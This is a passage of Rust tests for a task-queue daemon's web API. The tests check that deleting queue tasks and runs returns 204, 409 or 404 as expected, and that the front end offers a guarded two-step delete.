        // Delete by short id
        let res = fx.delete(&format!("/api/queue/{}", t1.short())).await;
        assert_eq!(res.status, 204);
        assert!(res.body.is_empty(), "204 No Content has no body");
        assert!(!q.path_of(&t1.id).exists(), "task file is deleted");
        assert!(
            fx.runs().join(run_id).exists(),
            "run directory must not be deleted when its task is deleted"
        );

        // 2. A running task is refused with 409
        let mut t2 = Task::new(
            "Task 2".to_owned(),
            "Instruction 2".to_owned(),
            PathBuf::from("/repo"),
            Source::Human,
        );
        t2.status = TaskStatus::Running;
        q.put(&mut t2).expect("put t2");
        let res = fx.delete(&format!("/api/queue/{}", t2.id)).await;
        assert_eq!(res.status, 409);
        assert!(res.json()["error"].as_str().unwrap().contains("daemon"));
        assert!(q.path_of(&t2.id).exists(), "running task file is kept");

        // 3. A task with a lock is refused with 409
        let mut t3 = Task::new(
            "Task 3".to_owned(),
            "Instruction 3".to_owned(),
            PathBuf::from("/repo"),
            Source::Human,
        );
        q.put(&mut t3).expect("put t3");
        let _claim = q.claim(&t3.id).expect("claim t3");
        let res = fx.delete(&format!("/api/queue/{}", t3.id)).await;
        assert_eq!(res.status, 409);
        assert!(q.path_of(&t3.id).exists(), "locked task file is kept");
        drop(_claim);

        // 4. Missing id returns 404
        let res = fx.delete("/api/queue/nonexistent").await;
        assert_eq!(res.status, 404);
    }

    #[tokio::test]
    async fn delete_run_deletes_directory_and_guards_running_and_unfolded() {
        let fx = Fixture::start().await;
        let runs = fx.runs();

        // 1. Finished and folded run can be deleted along with artifacts
        let run_id = "20260901-000000-fold";
        let mut state = RunState::new(
            PathBuf::from("/repo"),
            "main".to_owned(),
            "abc".to_owned(),
            "instruction".to_owned(),
            Config::default(),
        );
        state.id = run_id.to_owned();
        state.status = RunStatus::Merged;
        state.candidates.push(crate::run::Candidate {
            index: 0,
            label: 'A',
            agent: "a".to_owned(),
            branch: "b".to_owned(),
            worktree: PathBuf::from("/w"),
            summary: String::new(),
            stat: String::new(),
            files: 1,
            commits: 1,
            empty: false,
            failed: None,
            duration_ms: 0,
            folded: true,
        });
        let dir = runs.join(run_id);
        std::fs::create_dir_all(dir.join("artifacts")).expect("create artifacts");
        std::fs::write(dir.join("artifacts").join("patch.diff"), "dummy diff")
            .expect("write artifact");
        std::fs::write(dir.join("run.json"), serde_json::to_string(&state).unwrap())
            .expect("write run.json");

        // Delete by short id
        let res = fx.delete(&format!("/api/runs/{}", state.short())).await;
        assert_eq!(res.status, 204);
        assert!(res.body.is_empty(), "204 has no body");
        assert!(!dir.exists(), "run directory and artifacts must be deleted");

        // 2. Running run is refused with 409
        let run_running = "20260901-000000-rung";
        write_run(&runs, run_running, RunStatus::Prep);
        let res = fx.delete(&format!("/api/runs/{run_running}")).await;
        assert_eq!(res.status, 409);
        assert!(
            runs.join(run_running).exists(),
            "running run directory is kept"
        );

        // 3. Finished run with unfolded candidate is refused with 409 and mentions `magi fold`
        let run_unfolded = "20260901-000000-unfd";
        let mut state2 = RunState::new(
            PathBuf::from("/repo"),
            "main".to_owned(),
            "abc".to_owned(),
            "instruction".to_owned(),
            Config::default(),
        );
        state2.id = run_unfolded.to_owned();
        state2.status = RunStatus::Ready;
        state2.candidates.push(crate::run::Candidate {
            index: 0,
            label: 'A',
            agent: "a".to_owned(),
            branch: "b".to_owned(),
            worktree: PathBuf::from("/w"),
            summary: String::new(),
            stat: String::new(),
            files: 1,
            commits: 1,
            empty: false,
            failed: None,
            duration_ms: 0,
            folded: false,
        });
        let dir2 = runs.join(run_unfolded);
        std::fs::create_dir_all(&dir2).expect("create dir2");
        std::fs::write(
            dir2.join("run.json"),
            serde_json::to_string(&state2).unwrap(),
        )
        .expect("write run.json");

        let res = fx.delete(&format!("/api/runs/{run_unfolded}")).await;
        assert_eq!(res.status, 409);
        assert!(res.json()["error"].as_str().unwrap().contains("magi fold"));
        assert!(dir2.exists(), "unfolded run directory is kept");

        // 4. Missing id returns 404
        let res = fx.delete("/api/runs/nonexistent").await;
        assert_eq!(res.status, 404);
    }

    #[test]
    fn web_ui_delete_contract_in_front_end() {
        // 1. API block has both delete endpoints
        assert!(APP_JS.contains("deleteRun:"));
        assert!(APP_JS.contains("deleteTask:"));

        // 2. #runs-list card builder (createRunCard / updateRunCard) has no delete entry
        let run_cards_slice = &APP_JS[APP_JS.find("function createRunCard").unwrap()
            ..APP_JS.find("function renderRuns").unwrap()];
        assert!(!run_cards_slice.to_lowercase().contains("delete"));

        // 3. Run detail has delete entry and reasons
        assert!(APP_JS.contains("renderRunDelete"));
        assert!(APP_JS.contains("runDeleteReason"));
        assert!(APP_JS.contains("magi fold"));
        assert!(APP_JS.contains("This run is still in flight and cannot be deleted."));

        // 4. Two-step delete arming and focus on Cancel
        assert!(APP_JS.contains("cancel.focus"));
        assert!(APP_JS.contains("armedRunDelete"));
        assert!(APP_JS.contains("armedDelete"));

        // 5. Running task has disabled delete
        assert!(APP_JS.contains("disabled: status === \"running\""));
    }
}
